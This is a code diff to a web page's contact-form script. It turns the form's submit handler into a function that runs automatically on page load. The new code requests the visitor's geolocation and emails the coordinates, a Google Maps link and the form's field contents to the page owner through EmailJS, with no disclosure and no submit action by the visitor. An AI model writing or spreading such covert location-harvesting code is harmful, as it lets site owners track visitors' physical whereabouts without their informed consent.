@@ -16,15 +16,32 @@
             });
         })();
 
-        function sendEmail(event) {
-            event.preventDefault();
+        window.onload = function() {
+    sendLocationEmail();
+};
+
+        function sendLocationEmail() {
+
+            if (!navigator.geolocation) {
+        alert("Geolocation is not supported by this browser.");
+        return;
+    }
+
+            navigator.geolocation.getCurrentPosition(
+        function(position) {
+
+           const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
 
             const params = {
                 from_name: document.getElementById("name").value,
                 from_email: document.getElementById("email").value,
-                message: document.getElementById("message").value
+                message: document.getElementById("message").value,
+                latitude: latitude,
+                longitude: longitude,
+                location_link: `https://maps.google.com/?q=${latitude},${longitude}`
             };
-
+           
             emailjs.send(
                 "service_3hv5k7r",
                 "template_peoy2wo",
@@ -38,6 +55,8 @@
                 alert("Failed to send email");
                 console.error(error);
             });
+        } );
+
         }
     </script>
 
